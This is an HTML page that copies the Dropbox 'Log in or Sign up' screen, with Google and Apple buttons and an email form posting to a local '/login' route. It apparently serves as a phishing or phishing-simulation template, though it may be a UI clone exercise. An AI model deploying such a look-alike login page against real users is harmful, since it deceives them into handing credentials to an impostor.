<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dropbox â€“ Log in or Sign up</title>
  <style>
    /* Reset and Base Styles */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
      background-color: #fff;
      color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
    }
    .logo img {
      width: 120px;
      margin-bottom: 20px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .btn img {
      width: 20px;
      margin-right: 8px;
    }
    .btn-google {
      background-color: #fff;
      color: #000;
    }
    .btn-apple {
      background-color: #000;
      color: #fff;
    }
    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .divider hr {
      width: 45%;
      border: 0;
      border-top: 1px solid #ccc;
    }
    .divider span {
      margin: 0 10px;
      color: #666;
      font-size: 14px;
    }
    form input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    .btn-submit {
      background-color: #0061ff;
      color: #fff;
      font-weight: bold;
      border: none;
      padding: 14px;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
      font-size: 15px;
    }
    .btn-submit:hover {
      background-color: #0052d9;
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #888;
    }
    .footer a {
      color: #888;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .footer div {
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Logo -->
    <div class="logo">
    <img src="../static/dropbox.jpg" alt="Dropbox Logo">
    </div>

    <!-- Buttons -->
    <button class="btn btn-google">
      <img src="../static/google.png" alt="Google">
      Continue with Google
    </button>
    <button class="btn btn-apple">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
      Continue with Apple
    </button>

    <!-- Divider -->
    <div class="divider">
      <hr>
      <span>or</span>
      <hr>
    </div>

    <!-- Form -->
    <form method="POST" action="/login">
      <input type="email" name="email" placeholder="Email" required>
      <button type="submit" class="btn-submit">Continue</button>
    </form>

    <!-- Footer -->
    <div class="footer">
      <div><a href="#">Desktop app</a> | <a href="#">Mobile app</a></div>
      <div><a href="#">Features</a> | <a href="#">Security</a></div>
      <div><a href="#">Help</a> | <a href="#">Contact us</a></div>
    </div>
  </div>

</body>
</html>
